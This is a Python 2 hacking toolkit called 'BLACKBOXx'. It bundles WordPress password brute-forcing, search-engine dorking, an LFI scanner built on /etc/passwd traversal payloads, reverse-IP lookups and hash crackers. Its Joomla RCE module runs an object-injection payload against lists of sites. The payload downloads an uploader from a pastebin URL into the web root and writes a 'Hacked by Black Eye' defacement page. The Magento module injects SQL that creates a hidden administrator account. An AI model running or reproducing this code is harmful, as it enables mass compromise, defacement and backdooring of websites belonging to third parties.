#!/bin/python2
#####################################NOTICE######################################
###     This program is free software: you can redistribute it and/or modify  ###
###     it under the terms of the GNU General Public License as published by  ###
###     the Free Software Foundation, either version 3 of the License, or     ###
###     (at your option) any later version.                                   ###
###     This program is distributed in the hope that it will be useful,       ###
###                                                                           ###
###     but WITHOUT ANY WARRANTY; without even the implied warranty of        ###
###     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         ###
###     GNU General Public License for more details.                          ###
###     You should have received a copy of the GNU General Public License     ###
###     along with this program.  If not, see <http://www.gnu.org/licenses/>  ###
#################################################################################
### JOOMLA RCE  : https://www.exploit-db.com/exploits/39033/
### MAGENTO RCE : https://www.exploit-db.com/exploits/37977/

import requests,json,sys, time, re, os, base64, random,hashlib,timeit
from sys import platform
from time import gmtime, strftime
from optparse import OptionParser
from passlib.hash import nthash
__author__     = 'BLACK EYE'
__bitbucket__  = 'https://bitbucket.org/darkeye/'
__emailadd__   = 'blackdoor197@riseup.net'
__twitter__    = 'https://twitter.com/0x676'
__version__    = '0.8'
__license__    = 'GPLv2'
__scrname__    = 'BLACKBOXx v%s' % (__version__)

def __banner__():
	print color.BOLD+color.Y+" _____ __    _____ _____ _____ _____ _____ __ __"
	print color.BOLD+color.Y+"| __  |  |  |  _  |     |  |  | __  |     |  |  |_ _"
	print color.BOLD+color.Y+"| __ -|  |__|     |   --|    -| __ -|  |  |-   -|_'_|"
	print color.BOLD+color.Y+"|_____|_____|__|__|_____|__|__|_____|_____|__|__|_,_|"
	print color.W+color.BOLD+"                                                     {"+color.C+__version__+"#Dev"+color.W+"}"+color.ENDC

def __help__():
	print color.W+color.BOLD+"Usage   : "+color.ENDC+sys.argv[0]+" {Module}"
	print color.BOLD+color.W+"Help    : "+color.ENDC+sys.argv[0]+" -h/--help"
	print color.W+color.BOLD+"Modules : "+color.ENDC
	print "\t\t+ Wordpress Bruteforce          :   wordpress_brute"
	#print "\t\t+ SSH Bruteforce                :   ssh_brute"
	#print "\t\t+ FTP Bruteforce                :   ftp_brute"
	print "\t\t+ Dnsinfo                       :   dns_info"
	print "\t\t+ Joomla Rce                    :   rce_joomla"
	print "\t\t+ Magento Rce                   :   rce_magento"
	print "\t\t+ Google Dorker                 :   google_dorker(lfi scan)"
	print "\t\t+ Bing Dorker                   :   bing_dorker(lfi scan)"
	print "\t\t+ Crack Hash(MD5/SHA*/NTLM)     :   hash_killer"
	print "\t\t+ update Database (sudo needed) :   -u/--update"

def __update__():
	pass

class color:
	P    =  '\033[95m' # purple
	B    =  '\033[94m' # Blue
	BOLD =  '\033[1m'  # Bold
	G    =  '\033[92m' # Green
	Y    =  '\033[93m' # Yellow
	R    =  '\033[91m' # Red
	W    =  '\033[97m' # White
	BL   =  '\033[90m' # Black
	M    =  '\033[95m' # Magenta
	C    =  '\033[96m' # Cyan
	ENDC =  '\033[0m'  # end colors
	if sys.platform == 'win32':
		P    =  '' # purple
		B    =  '' # Blue
		BOLD =  ''  # Bold
		G    =  '' # Green
		Y    =  '' # Yellow
		R    =  '' # Red
		W    =  '' # White
		BL   =  '' # Black
		M    =  '' # Magenta
		C    =  '' # Cyan
		ENDC =  '' # end colors

class checker:
	def lfi(self, url):
		LFI = []
		def lfi_link(url):
			payloads=[
			"../etc/passwd",
			"../etc/passwd%00",
			"../../etc/passwd",
			"../../etc/passwd%00",
			"../../../etc/passwd",
			"../../../etc/passwd%00",
			"../../../../etc/passwd",
			"../../../../etc/passwd%00",
			"../../../../../etc/passwd",
			"../../../../../etc/passwd%00",
			"../../../../../../etc/passwd",
			"../../../../../../etc/passwd%00",
			"../../../../../../../etc/passwd",
			"../../../../../../../etc/passwd%00",
			"../../../../../../../../etc/passwd",
			"../../../../../../../../etc/passwd%00",
			"../../../../../../../../../etc/passwd",
			"../../../../../../../../../etc/passwd%00",
			"../../../../../../../../../../etc/passwd",
			"../../../../../../../../../../etc/passwd%00",
			"../../../../../../../../../../../etc/passwd",
			"../../../../../../../../../../../etc/passwd%00",
			"../../../../../../../../../../../../etc/passwd",
			"../../../../../../../../../../../../etc/passwd%00",
			"..%2Fetc%2Fpasswd",
			"..%2Fetc%2Fpasswd%2500",
			"..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2Fetc%2Fpasswd%2500",
			"..%2F..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2F..%2Fetc%2Fpasswd%2500",
			"..%2F..%2F..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
			"..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
			"..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
			"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500"]
			lfi = re.findall(r'=(.*)', url)
			for i in lfi:
				l=re.sub(i, '', url)
				for payload in payloads:
					payload=payload.strip()
					lfi = l+payload
					LFI.append(lfi)
		lfi_link(url)
		for i in LFI:
			r = requests.get(i)
			if "root" in r.content:
				print color.W+color.BOLD+"LFI FOUND :"+color.Y+i+color.ENDC
			else:
				print "Not Found : "+i
	def sqli(self, url):
		pass


####################################
##                                ##
##            DORKER              ##
##                                ##
####################################

class dorker:
	gurl,burl=[],[]
	def google(self, dork, start, stop):
		from cookielib import LWPCookieJar
		from urllib2 import Request, urlopen
		from urlparse import urlparse, parse_qs
		home_folder = os.getenv('HOME')
		if not home_folder:
			home_folder = os.getenv('USERHOME')
			if not home_folder:
				home_folder = '.'
		cookie_jar = LWPCookieJar(os.path.join(home_folder, '.google-cookie'))
		try:
			cookie_jar.load()
		except Exception:
			pass
		def randomm():
			tld = [
			'ae', 'am', 'as', 'at',
			'az', 'ba', 'be', 'bg',
			'bi', 'bs', 'ca', 'cd',
			'cg', 'ch', 'ci', 'cl',
			'co.bw', 'co.ck', 'co.cr', 'co.hu',
			'co.id', 'co.il', 'co.im', 'co.in',
			'co.je', 'co.jp', 'co.ke', 'co.kr',
			'co.ls', 'co.ma', 'co.nz', 'co.th',
			'co.ug', 'co.uk', 'co.uz', 'co.ve',
			'co.vi', 'co.za', 'co.zm', 'com',
			'com.af', 'com.ag', 'com.ar', 'com.au',
			'com.bd', 'com.bo', 'com.br', 'com.bz',
			'com.co', 'com.cu', 'com.do', 'com.ec',
			'com.eg', 'com.et', 'com.fj', 'com.gi',
			'com.gt', 'com.hk', 'com.jm', 'com.kw',
			'com.ly', 'com.mt', 'com.mx', 'com.my',
			'com.na', 'com.nf', 'com.ni', 'com.np',
			'com.om', 'com.pa', 'com.pe', 'com.ph',
			'com.pk', 'com.pr', 'com.py', 'com.qa',
			'com.sa', 'com.sb', 'com.sg', 'com.sv',
			'com.tj', 'com.tr', 'com.tw', 'com.ua',
			'com.uy', 'com.uz', 'com.vc', 'com.vn',
			'cz', 'de', 'dj', 'dk',
			'dm', 'ee', 'es', 'fi',
			'fm', 'fr', 'gg', 'gl',
			'gm', 'gr', 'hn', 'hr',
			'ht', 'hu', 'ie', 'is',
			'it', 'jo', 'kg', 'kz',
			'li', 'lk', 'lt', 'lu',
			'lv', 'md', 'mn', 'ms',
			'mu', 'mw', 'net','nl',
			'no', 'nr', 'nu', 'pl',
			'pn', 'pt', 'ro', 'ru',
			'rw', 'sc', 'se', 'sh',
			'si', 'sk', 'sm', 'sn',
			'tm', 'to', 'tp', 'tt',
			'uz', 'vg', 'vu', 'ws']
			tld_rand = random.sample(tld, 1)
			for tldd in tld_rand:
				return tldd
		def html(url):
			request = Request(url)
			request.add_header('User-Agent',
				'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)')
			cookie_jar.add_cookie_header(request)
			response = urlopen(request)
			cookie_jar.extract_cookies(response, request)
			html = response.read()
			response.close()
			cookie_jar.save()
			return html
		def run(dork, start, stop):
			tldd = randomm()
			while start<stop:
				url = "http://www.google."+tldd+"/search?q="+dork+"&start="+str(start)+"&inurl=https"
				htmll = html(url)
				link = re.findall(r'<h3 class="r"><a href="(.*?)"',htmll)
				for i in link:
					i=i.strip()
					o = urlparse(i, 'http')
					gopen = open("gurl.txt","a")
					if i.startswith('/url?'):
						link = parse_qs(o.query)['q'][0]
						self.gurl.append(link)
						gopen.write(str(link+"\n"))
				start+=10
			print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(self.gurl))+" FOUND"
		tldd = randomm()
		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" GOOLGE TLD    :  ."+tldd
		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" DORK          :  "+dork+color.ENDC
		run(dork, start, stop)
	def bing(self, ip,dork):
		url = []
		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" DORK          :  "+dork
		page = 0
		bopen = open("burl.txt","a")
		while page <= 102:
			bing ='http://www.bing.com/search?q=ip:'+ip+'+'+dork+'&count=50&first='+str(page)
			get = requests.get(bing)
			html = get.content
			link = re.findall(r'<h2><a href="(.*?)"', html)
			for i in link:
				url.append(i)
				self.burl.append(i)
				bopen.write(i+"\n")
			page += 50
		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(url))+" FOUND"+color.ENDC
	pass


####################################
##                                ##
##   BruteForcing WP/JM/FTP/SSH   ##
##                                ##
####################################

class BruteForce:
	def wordpress(self, url, username,wordlist):
		headers = {
		'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0'
		}
		#ok = time.strftime("%H:%M:%S")
		time.ctime()
		ok = time.strftime('%H:%M:%S')
		datetime = '['+ok+']'

		url = "http://"+url+"/wp-login.php"
		if not requests.get(url).status_code == 200:
			print "Error with  : "+url+"\nResponse is : "+str(requests.get(url).status_code)
			return 1
		print color.G+datetime+color.ENDC+" Starting Attack ! "
		print color.G+datetime+color.W+" wordpress  : "+color.Y+url
		word = open(wordlist, 'r')
		word = word.readlines()
		for words in word:
			words = words.strip()
			
			payload = {'log' : username,
			           'pwd' : words}
			
			s = requests.post(url, data=payload, headers=headers)
			print color.R+"------------------------------------------------------------------"
			print color.G+datetime+color.W+" username   : "+color.Y+payload['log']
			print color.G+datetime+color.W+" password   : "+color.Y+payload['pwd']
			if "wp-admin" in s.url:
				print color.G+datetime+color.R+" Login Succes"+color.ENDC
				print color.R+"------------------------------------------------------------------"+color.ENDC				
				break
			elif "wp-login.php" in s.url:
				print color.G+datetime+color.C+" Login False"+color.ENDC
	def ftp_brute(self, url, wordlist):
		pass
	def ssh_brute(self, url, wordlist):
		pass
	def joomla(self, url, wordlist):
		pass


####################################
##                                ##
##    Add RCE joomla & Magento    ##
##                                ##
####################################

class rce:
	def joomla(self, wordlist):
		wordlist = open(wordlist, "r")
		def get_url(url, user_agent):
			headers = {
			'User-Agent': user_agent
			}
			cookies = requests.get(url,headers=headers).cookies
			for _ in range(3):
				response = requests.get(url, headers=headers,cookies=cookies)    
			return response.content
		def php_str_noquotes(data):
			encoded = ""
			for char in data:
				encoded += "chr({0}).".format(ord(char))
			return encoded[:-1]
		def generate_payload(php_payload):
			php_payload = "eval({0})".format(php_str_noquotes(php_payload))
			terminate = '\xf0\xfd\xfd\xfd';
			exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
			injected_payload = "{};JFactory::getConfig();exit".format(php_payload)    
			exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
			exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
			return exploit_template
		pl = generate_payload("fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/up.php','w+'),file_get_contents('http://pastebin.com/raw/uWVsQH53')); fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/x.htm','w+'),'Hacked by Black Eye');")
		for i in wordlist.readlines():
			i=i.strip()
			get_url(i, pl)
			lala=requests.get(i+"/x.htm")
			if "Hacked" in lala.content:
				print i+"/x.htm  : Defaced | /up.php uploader file "
				z=open('Joomla_3.5_Shell.txt','a')
				z.write(i+"/x.htm\n")
				z.close()
			else:
				print i+" : Not Defaced"
		wordlist.close()


	def magento(self, wordlist):
		wordlist = open(wordlist, "r")
		for site in wordlist.readlines():
			site = site.strip()
			target_url = site + "/admin/Cms_Wysiwyg/directive/index/"
			if not target_url.startswith("http"):
				target_url = "http://" + target_url
			if target_url.endswith("/"):
				target_url = target_url[:-1]
			q="""
			SET @SALT = 'rp';
			SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
			SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
			INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
			INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');"""
			query = q.replace("\n", "").format(username="form", password="form")
			pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
			# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
			r = requests.post(target_url,
				data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
				"filter": base64.b64encode(pfilter),
				"forwarded": 1})
			if r.ok:
				print "{0}/admin with login : form:form".format(target_url)
			else:
				print "NOT WORKED with {0}".format(target_url)

####################################
##                                ##
##      Get Website from IP       ##
##                                ##
####################################

class dnsinfo:
	def yougetsignal(self, ip):
		def Details():
			yougetsignal = 'http://domains.yougetsignal.com/domains.php'
			data = {
			'remoteAddress': ip,
			'key'          : ''}
			headers={
			'User-Agent'  : 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
			get = requests.post(yougetsignal, data=data, headers=headers)
			get = get.text
			ok = json.loads(get)
			return ok
		
		def rzlt(details):
			print color.G+"Domains Hosted : "+color.W+color.BOLD+details['domainCount']+color.ENDC
			print color.G+"IP Address     : "+color.W+color.BOLD+details['remoteIpAddress']+color.ENDC
			print color.G+"Remote Address : "+color.W+color.BOLD+details['remoteAddress']+color.ENDC
			ipp = details['remoteIpAddress']
			rzt = open(ipp+".txt" ,'a')
			for domains,bl in details['domainArray']:
				rzt.write(domains+"\n")
			rzt.close
			print color.W+color.BOLD+"Domains is saved in "+ipp+".txt"+color.ENDC
		details = Details()
		rzlt(details)
	def viewdns(self,ip):
		url = "http://viewdns.info/reverseip/?host="+ip+"&t=1"
		headers = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1'  
		}
		r = requests.get(url, headers=headers)
		text =  r.content
		sites = re.findall(r"<tr>\s+<td>(.*?)</td><td align=", text)
		ipp = open(ip+".txt" ,'a')
		for i in sites:
			i=i.strip()
			ipp.write(i+"\n")
		print color.W+color.BOLD+"[+] "+str(len(sites))+" FOUND"+color.ENDC
		print color.W+color.BOLD+"[+] Domains is saved in "+ip+".txt"+color.ENDC
	def hackertarget(self,domain):
		urll = []
		url = "http://api.hackertarget.com/reverseiplookup/?q="+domain
		get = requests.get(url)
		html = get.content
		if "No records found for" in html:
			print"No Websites Found At "+domain
		else:
			black = re.findall(r'(.*)', html)
			black = ' '.join(black).split()
			ipp = open(domain+".txt" ,'a')
			for i in black:
				i = i.strip()
				urll.append(i)
				ipp.write(i+"\n")
			print color.W+color.BOLD+"[+] "+str(len(black))+" FOUND"+color.ENDC
			print color.W+color.BOLD+"[+] Domains is saved in "+domain+".txt"+color.ENDC

####################################
##                                ##
##         HASH CRACKER           ##
##                                ##
####################################
class cracker:
	def md5(self, md5, wordlist):
		start = timeit.default_timer()
		wordlist = open(wordlist, "r")
		word = wordlist.readlines()
		md5 = open(md5, "r")
		md5 = md5.readlines()
		for i in word:
			i=i.strip()
			for o in md5:
				o=o.strip()
				wordlistmd5 = hashlib.md5(o).hexdigest()
				if i==wordlistmd5:
					print "Hash Found :\n"+o+" : "+i
		stop = timeit.default_timer()
		print "Elapsed Time : "+str(stop - start)+"s"

	def sha1(self, sha1, wordlist):
		start = timeit.default_timer()
		wordlist = open(wordlist, "r")
		word = wordlist.readlines()
		sha1 = open(sha1, "r")
		sha1 = sha1.readlines()
		for i in word:
			i=i.strip()
			for o in sha1:
				o=o.strip()
				wordlistsha1 = hashlib.sha1(o).hexdigest()
				if i==wordlistsha1:
					print "Hash Found : "+o+" : "+i
			stop = timeit.default_timer()
		print "Elapsed Time : "+str(stop - start)+"s"
	def sha224(self, sha224, wordlist):
		start = timeit.default_timer()
		wordlist = open(wordlist, "r")
		word = wordlist.readlines()
		sha224 = open(sha224, "r")
		sha224 = sha224.readlines()
		for i in word:
			i=i.strip()
			for o in sha224:
				o=o.strip()
				wordlistsha1 = hashlib.sha224(o).hexdigest()
				if i==wordlistsha1:
					print "Hash Found : "+o+" : "+i
			stop = timeit.default_timer()
		print "Elapsed Time : "+str(stop - start)+"s"
	def sha256(self, sha256, wordlist):
		start = timeit.default_timer()
		wordlist = open(wordlist, "r")
		word = wordlist.readlines()
		sha256 = open(sha256, "r")
		sha256 = sha256.readlines()
		for i in word:
			i=i.strip()
			for o in sha256:
				o=o.strip()
				wordlistsha1 = hashlib.sha256(o).hexdigest()
				if i==wordlistsha1:
					print "Hash Found : "+o+" : "+i
			stop = timeit.default_timer()
		print "Elapsed Time : "+str(stop - start)+"s"
	def sha384(self, sha384, wordlist):
		start = timeit.default_timer()
		wordlist = open(wordlist, "r")
		word = wordlist.readlines()
		sha384 = open(sha384, "r")
		sha384 = sha384.readlines()
		for i in word:
			i=i.strip()
			for o in sha384:
				o=o.strip()
				wordlistsha1 = hashlib.sha384(o).hexdigest()
				if i==wordlistsha1:
					print "Hash Found : "+o+" : "+i
			stop = timeit.default_timer()
		print "Elapsed Time : "+str(stop - start)+"s"
	def sha512(self, sha512, wordlist):
		start = timeit.default_timer()
		wordlist = open(wordlist, "r")
		word = wordlist.readlines()
		sha512 = open(sha512, "r")
		sha512 = sha512.readlines()
		for i in word:
			i=i.strip()
			for o in sha512:
				o=o.strip()
				wordlistsha1 = hashlib.sha512(o).hexdigest()
				if i==wordlistsha1:
					print "Hash Found : "+o+" : "+i
			stop = timeit.default_timer()
		print "Elapsed Time : "+str(stop - start)+"s"
	def ntlm(self,wordlist, ha):
		wordlist = open(wordlist, "r")
		wordlist = wordlist.readlines()
		ha = open(ha, "r")
		ha = ha.readlines()
		for word in wordlist:
			word=word.strip()
			h = nthash.encrypt(word)
			for has in ha:
				if has == h:
					print "Found : "+has+" : "+word


####################################
##                                ##
##             MAIN               ##
##                                ##
####################################
def __main__():
	__banner__()
	for arg in sys.argv:
		if (arg=="--help" or arg=="-h"):
			__help__()


		if (arg=="wordpress_brute"):
			parser = OptionParser()
			parser.add_option("--url",
				help="URL OF Target")
			parser.add_option("--username","-u",
				help="Username of Wordpress")
			parser.add_option("--wordlist","-w",
				help="Wordlist for attack target")
			(options,args) = parser.parse_args()
			url = options.url
			username = options.username
			wordlist = options.wordlist
			if url and username and wordlist:
				BruteForce().wordpress(url, username, wordlist)
				break
			errors = []
			if (url == None):
				errors.append("[-] No URL specified.")
			if (username == None):
				errors.append("[-] No username specified.")
			if (wordlist == None):
				errors.append("[-] No Wordlist path specified.")
			if (len(errors) > 0):
				for error in errors:
					print color.BOLD+error+color.ENDC


		if (arg == "dns_info"):
			parser = OptionParser()
			parser.add_option("--ip",
				help="Parse IP address")
			parser.add_option("--yougetsignal","-y",
				help="Get website from yougetsignal",action="store_true")
			parser.add_option("--viewdns","-v",
				help="Get website from viewdns",action="store_true")
			parser.add_option("--hackertarget","-t",
				help="Get website from hackertarget",action="store_true")
			(options,args) = parser.parse_args()
			ip = options.ip
			yougetsignal = options.yougetsignal
			viewdns = options.viewdns
			hackertarget = options.hackertarget
			if ip and yougetsignal==True:
				dnsinfo().yougetsignal(ip)
			if ip and viewdns==True:
				dnsinfo().viewdns(ip)
			if ip and hackertarget==True:
				dnsinfo().hackertarget(ip)


		if (arg=="rce_joomla"):
			parser = OptionParser()
			parser.add_option("--wordlist","-w",
				help="wordlist path")
			(options,args) = parser.parse_args()
			wordlist = options.wordlist
			if wordlist:
				rce().joomla(wordlist)


		if (arg=="rce_magento"):
			parser = OptionParser()
			parser.add_option("--wordlist","-w",
				help="Wordlist path")
			(options,args) = parser.parse_args()
			wordlist = options.wordlist
			if wordlist:
				rce().magento(wordlist)


		if (arg=="google_dorker"):
			parser = OptionParser()
			parser.add_option("--dork","-d",
				help="Dork for get URL")
			parser.add_option("--start",type=int,default=0,
				help="Number of page for start")
			parser.add_option("--stop",type=int,
				help="Number of page to stop")
			parser.add_option("--lfi",
			help="Scan Founded website from LFI", action="store_true")
			(options,args) = parser.parse_args()
			dork = options.dork
			start = options.start
			stop = options.stop
			lfi = options.lfi
			if dork and start is not None and stop is not None: 
				dorker().google(dork, start, stop)
			if  dork and start is not None and stop is not None and lfi==True:
				print color.R+color.BOLD+"LFI Scanner : "+color.ENDC
				gurl= dorker().gurl
				for urll in gurl:
					urll= urll.strip()
					checker().lfi(urll)


		if (arg=="bing_dorker"):
			parser = OptionParser()
			parser.add_option("--ip")
			parser.add_option("--dork","-d",
				help="Dork for get URL")
			parser.add_option("--lfi",
			help="Scan Founded website from LFI", action="store_true")
			(options,args) = parser.parse_args()
			ip = options.ip
			dork = options.dork
			lfi = options.lfi
			if ip and dork:
				dorker().bing(ip,dork)
			if ip and dork and lfi==True:
				print color.R+color.BOLD+"LFI Scanner : "+color.ENDC
				burl= dorker().burl
				for urll in burl:
					urll= urll.strip()
					checker().lfi(urll)


		if (arg=="hash_killer"):
			parser = OptionParser()
			parser.add_option("-w","--wordlist",help="Path Of Wordlist !")
			parser.add_option("--md5", help="Path of MD5 hash")
			parser.add_option("--sha1", help="Path of SHA1 hash")
			parser.add_option("--sha224", help="Path of SHA224 hash")
			parser.add_option("--sha256", help="Path of SHA256 hash")
			parser.add_option("--sha384", help="Path of SHA384 hash")
			parser.add_option("--sha512", help="Path of SHA512 hash")
			parser.add_option("--ntlm", help="Path of NTLM hash")
			(options,args) = parser.parse_args()
			wordlist = options.wordlist
			md5 = options.md5
			sha1 = options.sha1
			sha224 = options.sha224
			sha256 = options.sha256
			sha384 = options.sha384
			sha512 = options.sha512
			ntlm = options.ntlm
			crack = cracker()
			if md5 and wordlist:
				crack.md5(wordlist, md5)
			if sha1 and wordlist:
				crack.sha1(wordlist, sha1)
			if sha224 and wordlist:
				crack.sha224(wordlist, sha224)
			if sha256 and wordlist:
				crack.sha256(wordlist, sha256)
			if sha384 and wordlist:
				crack.sha384(wordlist, sha384)
			if sha512 and wordlist:
				crack.sha512(wordlist, sha512)
			if ntlm and wordlist:
				crack.ntlm(ntlm,wordlist)
		if (arg=="-u" or arg=="--update"):
			__update__()
if __name__ == '__main__':
	try:
		__main__()
	except KeyboardInterrupt:
		print color.BOLD+color.Y+"Exiting Now !"+color.ENDC
		sys.exit(0)
	#except urllib2.HTTPError:
	#	print color.BOLD+color.R+"503 : Error Retry Later Plz !"+color.ENDC
